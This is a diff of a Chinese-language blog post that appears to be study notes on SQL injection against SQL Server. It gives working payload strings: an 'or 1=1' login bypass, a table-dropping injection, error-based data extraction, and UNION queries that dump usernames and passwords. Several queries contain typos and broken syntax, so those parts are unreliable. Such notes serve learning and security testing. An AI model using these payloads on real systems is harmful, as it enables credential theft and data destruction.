@@ -574,10 +574,31 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>SQL Server 注入’<br>SQL  Server 可以精确到定位错误消息。因此攻击者通过错误消息来提取消息<br>select * from user where  username&#x3D;’root’ and password&#x3D;’root’ having 1&#x3D;1–’<br>执行器：user.username 无效</p>
+                <p>SQL Server 注入<br>SQL  Server 可以精确到定位错误消息。因此攻击者通过错误消息来提取消息</p>
+<p>sys.databases：所有数据库名<br>INFORMATION_SCHEMA.TABLES：当前数据库中的表<br>INFORMATION_SCHEMA.COLUMNS：当前数据库中的列<br>sys.database_files：数据库数据文件<br>注释：&#x2F;**&#x2F;和–<br>常用全局变量：@@SERVERNAME：返回运行 SQL Server 的本地服务器的名称。<br>逻辑运算符<br>ALL：如果一组的比较都为True，那么为True</p>
+<p>AND：如果两个布尔表达式都为True，则为True</p>
+<p>ANY：如果一组的比较中任何一个为True，则为True</p>
+<p>BETWEEN：如果操作数在某个范围内，那么为True</p>
+<p>IN：如果操作数等于表达式列表之一，那么为True</p>
+<p>LIKE：如果操作数与一种模式相匹配，则为True</p>
+<p>NOT：对任何其他布尔运算的值取反</p>
+<p>OR：如果两个布尔表达式中的一个为True,则为True</p>
+<p>SOME：如果在一组比较中，有些为True，则为True</p>
+<p>TOP  ：在SQL server中，没有MySQL中的LIMIT控制符，若要实现limit控制符功能则可以用top进行代替</p>
+<p>@@VERSION：返回当前的 SQL Server 安装的版本、处理器体系结构、生成日期和操作系统。</p>
+<p>注入原理：<br>String sql &#x3D;”select count(*) from admin where usename &#x3D;’”+admin.GetUsername()”‘+” and password &#x3D;’”+admin.getPassword”‘“</p>
+<p>注入原理：<br>String sql &#x3D;”select count(*) from admin where usename &#x3D;’”+admin.GetUsername()”‘+” and password &#x3D;’”+admin.getPassword”‘“</p>
+<p>select count(<em>) from admin where username&#x3D;’admin’ and pasword&#x3D;’password’<br>select count(</em>) from admin where username&#x3D;’’or 1&#x3D;1–’ and pasword&#x3D;’’</p>
+<p>‘or 1&#x3D;1–’  注释了后面的password，并且1&#x3D;1这条语句永远为真。<br>这条语句相当于select count(*) from admin  &#x2F;&#x2F;查询admin表里所有的数据<br>甚至 ‘ or 1&#x3D;1;drop table admin – 删除admin表</p>
+<p>&#x2F;&#x2F;查询表的表、列、字段<br>?id&#x3D;1 and 1&#x3D;1<br>当?id&#x3D;1   id&#x3D;2   id&#x3D;5   出现正常回显，？id&#x3D;1’时出现报错说明此时有注入点<br>?id&#x3D;1’ and 1&#x3D;2<br>?id&#x3D;1  order by  4–+<br>?id&#x3D;1’ union select by 1,2,3–+<br>?id&#x3D;-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’–+<br>?id&#x3D;-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’users’–+<br>?id&#x3D;-1’ union select 1,group_concat(username,password),3 from users–+</p>
+<p>判断注入：?id&#x3D; 1’–<br>select * from user where  username&#x3D;’root’ and password&#x3D;’root’ having 1&#x3D;1–’<br>执行器报错：user.username 无效</p>
 <p>思想：将数据类型转换另外一种,或者把字符串和非字符串比较<br>1.利用havin子句’查询：’select user from username &#x3D;’root’ and 1 &gt; (select top1 username from user)</p>
 <p>sql server 内置函数（CASE CONVER）<br>select * from users where username &#x3D;’root’ and password&#x3D;’root’ and 1&#x3D;conver(int,select top 1 users.username from user)&#x2F;&#x2F;递归<br>FOR XML PATH ：’select * from users where username &#x3D;’root’ and password&#x3D;’root’ and 1&#x3D;CONVERT(int,(select stuff((select ‘,’+ user.username , ‘|’ +user.password from from users forxml path(‘’)),1,1,’’)))</p>
 <p>获取元素据<br>select table_name from information_schema.tables<br>select column_name from information_schema.column where table_name&#x3D;’student’</p>
+<p>Order by语句 ：判断数据库表的列数（order 本身对某一列进行排序，默认升序）<br>select id,username,password from users where id &#x3D;1    &#x2F;2    &#x2F;3   直到报错就知道有多少列数</p>
+<p>配合union来攻击字段数<br>1.select id,username,password,sex from users where id &#x3D;1 union select null<br>  select null<br>  select null null<br>  select null null null 直到没有报错</p>
+<p>2.配合union来查询敏感信息<br>  id&#x3D;5 union select ‘X’, null,null,null from sysobject where xtype&#x3D;’U’<br>  id&#x3D;5 union select  null,’X’,null,null from sysobject where xtype&#x3D;’U’<br>  id&#x3D;5 union select  null,null,’X’,null from sysobject where xtype&#x3D;’U’<br>  id&#x3D;5 union select  null,null,null ,’X’,from sysobject where xtype&#x3D;’U’</p>
+<p>blog&#x2F;source&#x2F;image.png</p>
 
                 
             </div>
